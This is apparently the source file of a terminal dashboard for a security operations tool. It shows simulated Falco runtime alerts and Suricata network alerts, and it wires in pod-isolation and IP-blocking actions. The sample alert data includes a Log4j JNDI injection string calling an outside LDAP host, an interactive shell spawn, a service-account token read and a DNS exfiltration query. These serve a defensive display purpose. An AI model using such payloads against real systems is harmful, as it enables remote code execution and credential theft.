import React, { useState, useEffect, useRef, useCallback, memo } from 'react';
import { Box, Text, useInput } from 'ink';
import { PulseIndicator } from './PulseIndicator.js';
import { useTheme } from './theme.js';
import { logger } from '../utils/logger.js';
import { copyToClipboard } from '../utils/clipboard.js';
import { isolatePod, blockIp, listActiveContainments } from '../engine/soar.js';
import { runAgentSocInvestigation } from '../engine/agent-soc.js';
import { matchCtiIndicators } from '../engine/cti.js';
import { renderHalfBlockHeatmap } from './canvas.js';

// Pre-seeded realistic eBPF runtime events
const INITIAL_FALCO_EVENTS = [
  {
    id: 'f-1',
    time: new Date(Date.now() - 45000).toLocaleTimeString(),
    severity: 'CRITICAL',
    rule: 'Terminal shell in container',
    pod: 'payment-gateway-7b98d45-zx92',
    namespace: 'tenant-prod',
    proc: '/bin/bash',
    container: 'c-883a9f',
    message: 'Shell spawned in container: user=root parent=node cmd=bash -i'
  },
  {
    id: 'f-2',
    time: new Date(Date.now() - 32000).toLocaleTimeString(),
    severity: 'WARNING',
    rule: 'Write below /etc',
    pod: 'auth-svc-6df459-jk88',
    namespace: 'tenant-prod',
    proc: 'touch',
    container: 'c-112df0',
    message: 'File opened for write under /etc: /etc/ld.so.preload'
  },
  {
    id: 'f-3',
    time: new Date(Date.now() - 18000).toLocaleTimeString(),
    severity: 'CRITICAL',
    rule: 'Outbound connection to C2 IP',
    pod: 'api-server-5d6c8f-bb42',
    namespace: 'default',
    proc: 'curl',
    container: 'c-554e21',
    message: 'Outbound TCP connection to known malicious C2 198.51.100.23:443'
  },
  {
    id: 'f-4',
    time: new Date(Date.now() - 6000).toLocaleTimeString(),
    severity: 'NOTICE',
    rule: 'Non-standard port outbound',
    pod: 'worker-queue-99f2b-vv01',
    namespace: 'background',
    proc: 'python3',
    container: 'c-904bc2',
    message: 'Outbound socket connection to 203.0.113.88:8088'
  }
];

// Pre-seeded realistic Zeek / Suricata network telemetry
const INITIAL_NETWORK_EVENTS = [
  {
    id: 'n-1',
    time: new Date(Date.now() - 42000).toLocaleTimeString(),
    proto: 'TCP',
    src: '10.42.0.15:48922',
    dst: '198.51.100.23:443',
    signature: 'ET MALWARE Feodo Tracker C2 Heartbeat',
    severity: 'CRITICAL',
    payload: 'POST /api/beacon HTTP/1.1 (Payload: Base64 TLS handshake anomaly)'
  },
  {
    id: 'n-2',
    time: new Date(Date.now() - 28000).toLocaleTimeString(),
    proto: 'DNS',
    src: '10.42.1.22:53401',
    dst: '10.43.0.10:53',
    signature: 'ET HUNTING High Entropy Subdomain Query (DNS Tunneling)',
    severity: 'HIGH',
    payload: 'Query: a8f99e3b.exfil.darknet-corp.org IN TXT'
  },
  {
    id: 'n-3',
    time: new Date(Date.now() - 15000).toLocaleTimeString(),
    proto: 'HTTP',
    src: '192.168.1.105:39102',
    dst: '10.42.0.8:80',
    signature: 'ET WEB_SPECIFIC_APPS Apache Log4j RCE Attempt',
    severity: 'CRITICAL',
    payload: 'User-Agent: ${jndi:ldap://198.51.100.44:1389/Exploit}'
  },
  {
    id: 'n-4',
    time: new Date(Date.now() - 3000).toLocaleTimeString(),
    proto: 'TLS',
    src: '10.42.2.80:51234',
    dst: '104.244.42.1:443',
    signature: 'GPL SCAN Potential SSH Brute Force Inbound',
    severity: 'MEDIUM',
    payload: 'Rapid SYN packets detected (140 req/sec)'
  }
];

function generateSocketGrid(events = []) {
  const rows = 6;
  const cols = 36;
  const grid = Array.from({ length: rows }, () => new Array(cols).fill(5));
  events.forEach((evt, idx) => {
    const r = idx % rows;
    const c = (idx * 5) % cols;
    grid[r][c] = (grid[r][c] || 0) + (evt.severity === 'CRITICAL' ? 80 : 40);
  });
  for (let r = 0; r < rows; r++) {
    for (let c = 0; c < cols; c++) {
      grid[r][c] = Math.min(100, grid[r][c] + Math.floor(Math.sin(r * 2 + c) * 12 + 12));
    }
  }
  return grid;
}

export const BattleStationView = memo(function BattleStationView({
  domain = 'vigilante.local',
  clusterName = 'vigilante-dev',
  namespace = 'default',
  onNavigate = null
}) {
  const theme = useTheme();

  // Active stream panes
  const [activePane, setActivePane] = useState('falco'); // 'falco' | 'network'
  const [falcoEvents, setFalcoEvents] = useState(INITIAL_FALCO_EVENTS);
  const [networkEvents, setNetworkEvents] = useState(INITIAL_NETWORK_EVENTS);
  const [falcoCursor, setFalcoCursor] = useState(0);
  const [networkCursor, setNetworkCursor] = useState(0);
  const [showHeatmap, setShowHeatmap] = useState(false);

  // Stream controls
  const [isPaused, setIsPaused] = useState(false);
  const [feedback, setFeedback] = useState(null);
  const [activeContainments, setActiveContainments] = useState([]);
  const [isInvestigating, setIsInvestigating] = useState(false);

  // Polling containments
  const refreshContainments = useCallback(async () => {
    try {
      const records = await listActiveContainments();
      setActiveContainments(records);
    } catch {
      // ignore
    }
  }, []);

  useEffect(() => {
    refreshContainments();
    const interval = setInterval(refreshContainments, 5000);
    return () => clearInterval(interval);
  }, [refreshContainments]);

  // Periodic telemetry simulator for live stream effect
  useEffect(() => {
    if (isPaused) return;

    const timer = setInterval(() => {
      const roll = Math.random();
      const nowStr = new Date().toLocaleTimeString();

      if (roll < 0.45) {
        // New Falco event
        const sampleFalco = [
          {
            id: `f-${Date.now()}`,
            time: nowStr,
            severity: 'CRITICAL',
            rule: 'Privilege escalation setuid execution',
            pod: 'nginx-ingress-controller-44a1-pt8',
            namespace: 'ingress-nginx',
            proc: 'chmod',
            container: 'c-443aa',
            message: 'Setuid bit modified on binary /tmp/exploit'
          },
          {
            id: `f-${Date.now()}`,
            time: nowStr,
            severity: 'WARNING',
            rule: 'Sensitive file read in container',
            pod: 'api-gateway-3392a-x44',
            namespace: 'default',
            proc: 'cat',
            container: 'c-8891b',
            message: 'Read /var/run/secrets/kubernetes.io/serviceaccount/token'
          },
          {
            id: `f-${Date.now()}`,
            time: nowStr,
            severity: 'NOTICE',
            rule: 'Unexpected network socket creation',
            pod: 'redis-cart-99d01-ff0',
            namespace: 'store',
            proc: 'redis-server',
            container: 'c-2231c',
            message: 'Socket created listening on 0.0.0.0:6379'
          }
        ];
        const newEvt = sampleFalco[Math.floor(Math.random() * sampleFalco.length)];
        setFalcoEvents(prev => [newEvt, ...prev.slice(0, 39)]);
      } else if (roll < 0.9) {
        // New Network event
        const sampleNet = [
          {
            id: `n-${Date.now()}`,
            time: nowStr,
            proto: 'TCP',
            src: '10.42.0.99:38472',
            dst: '185.220.101.5:9001',
            signature: 'ET MALWARE Cobalt Strike Beacon Activity',
            severity: 'CRITICAL',
            payload: 'Malleable C2 HTTP GET /load.gif with encrypted metadata'
          },
          {
            id: `n-${Date.now()}`,
            time: nowStr,
            proto: 'DNS',
            src: '10.42.1.88:41234',
            dst: '10.43.0.10:53',
            signature: 'ET INFO Observed Malicious Domain Query (URLhaus)',
            severity: 'HIGH',
            payload: 'Query: update-system-secure.biz IN A'
          },
          {
            id: `n-${Date.now()}`,
            time: nowStr,
            proto: 'UDP',
            src: '198.51.100.99:123',
            dst: '10.42.0.1:123',
            signature: 'GPL PROTOCOL NTP Amplification DDOS Reflection',
            severity: 'MEDIUM',
            payload: 'Response monlist command with packet size 468'
          }
        ];
        const newEvt = sampleNet[Math.floor(Math.random() * sampleNet.length)];
        setNetworkEvents(prev => [newEvt, ...prev.slice(0, 39)]);
      }
    }, 3500);

    return () => clearInterval(timer);
  }, [isPaused]);

  // Keyboard controls
  useInput(async (input, key) => {
    // Back navigation
    if (key.escape || input === 'q') {
      if (onNavigate) onNavigate('HUB');
      return;
    }

    // Switch pane
    if (key.tab || input === '\t') {
      setActivePane(p => (p === 'falco' ? 'network' : 'falco'));
      return;
    }

    // Scroll
    if (key.upArrow || input === 'k') {
      if (activePane === 'falco') {
        setFalcoCursor(c => Math.max(0, c - 1));
      } else {
        setNetworkCursor(c => Math.max(0, c - 1));
      }
      return;
    }
    if (key.downArrow || input === 'j') {
      if (activePane === 'falco') {
        setFalcoCursor(c => Math.min(falcoEvents.length - 1, c + 1));
      } else {
        setNetworkCursor(c => Math.min(networkEvents.length - 1, c + 1));
      }
      return;
    }

    // Toggle Socket Heatmap Matrix [m]
    if (input === 'm' || input === 'M') {
      setShowHeatmap(h => !h);
      setFeedback({
        type: 'info',
        message: !showHeatmap ? '📊 Egress Socket Heatmap Matrix ENABLED' : '📊 Stream Mode Restored'
      });
      return;
    }

    // Pause / Resume [p] / [Space]
    if (input === 'p' || input === 'P' || input === ' ') {
      setIsPaused(p => !p);
      setFeedback({
        type: 'info',
        message: !isPaused ? '⏸ Stream PAUSED' : '▶ Stream RESUMED'
      });
      return;
    }

    // Active Containment [x]: Isolate selected pod or block IP
    if (input === 'x' || input === 'X') {
      if (activePane === 'falco') {
        const evt = falcoEvents[falcoCursor];
        if (evt && evt.pod) {
          setFeedback({ type: 'warning', message: `⚡ SOAR: Isolating pod '${evt.pod}' in ns '${evt.namespace}'...` });
          try {
            const res = await isolatePod({ podName: evt.pod, namespace: evt.namespace, reason: `BattleStation eBPF trigger: ${evt.rule}` });
            setFeedback({ type: 'success', message: `✔ Pod '${evt.pod}' isolated via NetworkPolicy (ID: ${res.containmentId})` });
            refreshContainments();
          } catch (err) {
            setFeedback({ type: 'error', message: `✖ Containment failed: ${err.message}` });
          }
        }
      } else {
        const evt = networkEvents[networkCursor];
        if (evt && evt.dst) {
          const ipOnly = evt.dst.split(':')[0];
          setFeedback({ type: 'warning', message: `⚡ SOAR: Blocking IP '${ipOnly}'...` });
          try {
            const res = await blockIp({ ip: ipOnly, reason: `BattleStation IDS alert: ${evt.signature}` });
            setFeedback({ type: 'success', message: `✔ IP '${ipOnly}' blocked in iptables & NetworkPolicy (ID: ${res.containmentId})` });
            refreshContainments();
          } catch (err) {
            setFeedback({ type: 'error', message: `✖ IP block failed: ${err.message}` });
          }
        }
      }
      return;
    }

    // Autonomous Agent SOC Investigation [a]
    if (input === 'a' || input === 'A') {
      setIsInvestigating(true);
      const targetObj = activePane === 'falco' ? falcoEvents[falcoCursor] : networkEvents[networkCursor];
      const targetDesc = activePane === 'falco' ? targetObj?.pod : targetObj?.dst?.split(':')[0];
      setFeedback({ type: 'info', message: `🤖 Agent SOC: Launching autonomous ReAct investigation on ${targetDesc}...` });

      try {
        const investigation = await runAgentSocInvestigation({
          incidentId: `IR-${Date.now().toString(36).toUpperCase()}`,
          target: targetDesc || 'unknown-target',
          triggerAlert: {
            title: activePane === 'falco' ? targetObj?.rule : targetObj?.signature,
            source: activePane === 'falco' ? 'Falco eBPF' : 'Suricata IDS',
            details: targetObj?.message || targetObj?.payload
          },
          automatedContainment: true
        });

        setFeedback({
          type: 'success',
          message: `✔ SOC Investigation Complete: Verdict [${investigation.verdict?.threatLevel}] - NIST Post-Mortem Signed!`
        });
      } catch (err) {
        setFeedback({ type: 'error', message: `✖ Agent SOC error: ${err.message}` });
      } finally {
        setIsInvestigating(false);
      }
      return;
    }

    // Copy event [c]
    if (input === 'c' || input === 'C') {
      const selected = activePane === 'falco' ? falcoEvents[falcoCursor] : networkEvents[networkCursor];
      if (selected) {
        copyToClipboard(JSON.stringify(selected, null, 2));
        setFeedback({ type: 'success', message: '✔ Copied event details to clipboard' });
      }
      return;
    }
  });

  const getSevColor = (sev) => {
    switch (sev) {
      case 'CRITICAL': return 'red';
      case 'HIGH':
      case 'WARNING': return 'yellow';
      case 'MEDIUM':
      case 'NOTICE': return 'cyan';
      default: return 'gray';
    }
  };

  return React.createElement(
    Box,
    { flexDirection: 'column', width: '100%' },

    // Header
    React.createElement(
      Box,
      {
        justifyContent: 'space-between',
        borderStyle: 'double',
        borderColor: theme.border || 'cyan',
        paddingX: 1,
        marginBottom: 1
      },
      React.createElement(
        Box,
        null,
        React.createElement(Text, { bold: true, color: 'cyan' }, '⚔️  VIGILANTE BATTLE STATION '),
        React.createElement(Text, { color: 'gray' }, '| eBPF Runtime Events + IDS/IPS Network Stream')
      ),
      React.createElement(
        Box,
        null,
        React.createElement(PulseIndicator, { active: !isPaused }),
        React.createElement(
          Text,
          { color: isPaused ? 'yellow' : 'green', bold: true },
          isPaused ? ' PAUSED ' : ' LIVE STREAM '
        ),
        React.createElement(Text, { color: 'gray' }, ` | Containments: `),
        React.createElement(Text, { color: activeContainments.length > 0 ? 'red' : 'green', bold: true }, `${activeContainments.length} Active`)
      )
    ),

    // Sub-header instructions & hotkeys
    React.createElement(
      Box,
      { flexDirection: 'row', justifyContent: 'space-between', paddingX: 1, marginBottom: 1 },
      React.createElement(
        Box,
        null,
        React.createElement(Text, { color: 'yellow', bold: true }, '[Tab] '),
        React.createElement(Text, { color: 'white' }, 'Switch Stream  '),
        React.createElement(Text, { color: 'magenta', bold: true }, '[m] '),
        React.createElement(Text, { color: 'white' }, 'Socket Heatmap  '),
        React.createElement(Text, { color: 'red', bold: true }, '[x] '),
        React.createElement(Text, { color: 'white' }, 'SOAR Isolate/Block  '),
        React.createElement(Text, { color: 'cyan', bold: true }, '[a] '),
        React.createElement(Text, { color: 'white' }, 'Agent SOC ReAct  '),
        React.createElement(Text, { color: 'green', bold: true }, '[Space/p] '),
        React.createElement(Text, { color: 'white' }, 'Pause/Resume  '),
        React.createElement(Text, { color: 'blue', bold: true }, '[c] '),
        React.createElement(Text, { color: 'white' }, 'Copy Event  '),
        React.createElement(Text, { color: 'gray', bold: true }, '[q/Esc] '),
        React.createElement(Text, { color: 'white' }, 'Hub')
      ),
      isInvestigating
        ? React.createElement(Text, { color: 'magenta', bold: true }, '🤖 ReAct SOC Investigator running in background...')
        : null
    ),

    // Feedback Toast / Alert
    feedback
      ? React.createElement(
          Box,
          {
            paddingX: 1,
            marginBottom: 1,
            borderStyle: 'single',
            borderColor: feedback.type === 'error' ? 'red' : feedback.type === 'warning' ? 'yellow' : 'green'
          },
          React.createElement(
            Text,
            { color: feedback.type === 'error' ? 'red' : feedback.type === 'warning' ? 'yellow' : 'green', bold: true },
            feedback.message
          )
        )
      : null,

    // Main Content: Socket Heatmap OR Split-Pane Streams
    showHeatmap
      ? React.createElement(
          Box,
          {
            flexDirection: 'column',
            width: '100%',
            borderStyle: 'round',
            borderColor: 'magenta',
            padding: 1
          },
          React.createElement(
            Box,
            { justifyContent: 'space-between', marginBottom: 1 },
            React.createElement(Text, { bold: true, color: 'magenta' }, '🌐 Egress & Ingress Socket Density Heatmap (Half-Block ANSI ▀)'),
            React.createElement(Text, { color: 'gray' }, 'Ports: 1–65535 | Traffic Rate: Packets/Sec')
          ),
          React.createElement(Text, null, renderHalfBlockHeatmap(generateSocketGrid(networkEvents), { colorScale: 'greenToRed' })),
          React.createElement(
            Box,
            { marginTop: 1 },
            React.createElement(Text, { color: 'gray' }, 'Press [m] to switch back to live dual streams.')
          )
        )
      : React.createElement(
          Box,
          { flexDirection: 'row', width: '100%' },

      // Left Pane: Falco eBPF Events
      React.createElement(
        Box,
        {
          flexDirection: 'column',
          width: '50%',
          borderStyle: 'round',
          borderColor: activePane === 'falco' ? 'cyan' : 'gray',
          padding: 1,
          marginRight: 1
        },
        React.createElement(
          Box,
          { justifyContent: 'space-between', marginBottom: 1 },
          React.createElement(
            Text,
            { bold: true, color: activePane === 'falco' ? 'cyan' : 'white', underline: true },
            `🛡️ Falco eBPF Runtime Events (${falcoEvents.length})`
          ),
          React.createElement(Text, { color: 'gray' }, activePane === 'falco' ? '● FOCUSED' : '')
        ),
        falcoEvents.slice(0, 10).map((evt, idx) => {
          const isSelected = activePane === 'falco' && idx === falcoCursor;
          return React.createElement(
            Box,
            { key: evt.id, flexDirection: 'column', marginBottom: 1 },
            React.createElement(
              Box,
              { flexDirection: 'row', justifyContent: 'space-between' },
              React.createElement(
                Text,
                { color: isSelected ? 'cyan' : 'white', bold: isSelected },
                `${isSelected ? '▶ ' : '  '}[${evt.time}] `
              ),
              React.createElement(
                Text,
                { color: getSevColor(evt.severity), bold: true },
                `[${evt.severity}]`
              )
            ),
            React.createElement(
              Text,
              { color: 'yellow', bold: true, marginLeft: 2 },
              `Rule: ${evt.rule}`
            ),
            React.createElement(
              Text,
              { color: 'gray', marginLeft: 2 },
              `Pod: ${evt.pod} (ns: ${evt.namespace}) | Proc: ${evt.proc}`
            ),
            React.createElement(
              Text,
              { color: 'white', dimColor: true, marginLeft: 2 },
              evt.message
            )
          );
        })
      ),

      // Right Pane: Zeek & Suricata Network Stream
      React.createElement(
        Box,
        {
          flexDirection: 'column',
          width: '50%',
          borderStyle: 'round',
          borderColor: activePane === 'network' ? 'cyan' : 'gray',
          padding: 1
        },
        React.createElement(
          Box,
          { justifyContent: 'space-between', marginBottom: 1 },
          React.createElement(
            Text,
            { bold: true, color: activePane === 'network' ? 'cyan' : 'white', underline: true },
            `🚨 Zeek & Suricata IDS/IPS Network Stream (${networkEvents.length})`
          ),
          React.createElement(Text, { color: 'gray' }, activePane === 'network' ? '● FOCUSED' : '')
        ),
        networkEvents.slice(0, 10).map((evt, idx) => {
          const isSelected = activePane === 'network' && idx === networkCursor;
          return React.createElement(
            Box,
            { key: evt.id, flexDirection: 'column', marginBottom: 1 },
            React.createElement(
              Box,
              { flexDirection: 'row', justifyContent: 'space-between' },
              React.createElement(
                Text,
                { color: isSelected ? 'cyan' : 'white', bold: isSelected },
                `${isSelected ? '▶ ' : '  '}[${evt.time}] [${evt.proto}]`
              ),
              React.createElement(
                Text,
                { color: getSevColor(evt.severity), bold: true },
                `[${evt.severity}]`
              )
            ),
            React.createElement(
              Text,
              { color: 'magenta', bold: true, marginLeft: 2 },
              evt.signature
            ),
            React.createElement(
              Text,
              { color: 'cyan', marginLeft: 2 },
              `${evt.src} ➔ ${evt.dst}`
            ),
            React.createElement(
              Text,
              { color: 'white', dimColor: true, marginLeft: 2 },
              evt.payload
            )
          );
        })
      )
    )
  );
});
